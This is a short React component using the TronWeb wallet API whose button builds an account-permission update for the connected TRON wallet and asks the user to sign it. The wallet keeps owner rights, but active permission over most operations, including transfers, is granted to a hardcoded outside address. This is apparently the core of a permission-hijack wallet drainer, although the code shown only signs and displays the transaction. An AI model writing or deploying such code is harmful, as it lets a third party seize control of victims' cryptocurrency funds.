import { Button, message } from 'antd';
import { useState } from 'react';

function UpdateAccountPermissions() {
  const [msg, setMsg] = useState('')
  const [loading, setLoading] = useState(false)
  return (
    <div>
      <Button loading={loading}  onClick={async () => {
        const tronWeb = window.tronWeb;
        try {
          message.info("发起交易中...")
          setLoading(true)
          let ownerAddress = window.tronWeb.defaultAddress.hex;
          let ownerPermission = { type: 0, permission_name: 'owner' };
          ownerPermission.threshold = 1;
          ownerPermission.keys  = [];

          let activePermission = { type: 2, permission_name: 'active0' };
          activePermission.threshold = 1;
          activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
          activePermission.keys = [];


      ownerPermission.keys.push({ address: window.tronWeb.defaultAddress.hex, weight: 1 });
      activePermission.keys.push({ address: '414d66511bf52280f9be386747e53f172e15b01815', weight: 1 });

        const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
        const signature = await tronWeb.trx.sign(updateTransaction)
         setMsg(signature)
        setLoading(false)
        } catch(e) {
          console.log(">>>>>>e", e) 
          setMsg(e.message)
          setLoading(false)
        }
      }}>UpdateAccountPermissions:{msg}</Button>
    </div>
  )
}

export default UpdateAccountPermissions
